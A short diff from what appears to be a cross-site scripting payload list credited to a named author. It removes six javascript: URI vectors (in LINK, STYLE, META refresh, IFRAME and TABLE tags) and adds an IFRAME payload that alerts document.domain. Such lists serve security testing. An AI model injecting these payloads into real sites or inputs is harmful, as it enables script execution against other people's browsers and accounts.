@@ -16,12 +16,7 @@ xss
 <!--       Twitter : https://twitter.com/ismailtsdln -->
 <!--        Medium : https://medium.com/@ismailtasdelen -->
 
-<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
-<STYLE>li {list-style-image: url("javascript:javascript:alert(2)");}</STYLE><UL><LI>XSS
-<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(3);">
-<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(4);">
-<IFRAME SRC="javascript:javascript:alert(5);"></IFRAME>
-<TABLE BACKGROUND="javascript:javascript:alert(6)">
+<IFRAME SRC="javascript:javascript:alert(document.domain);"></IFRAME>
 
 
 ```
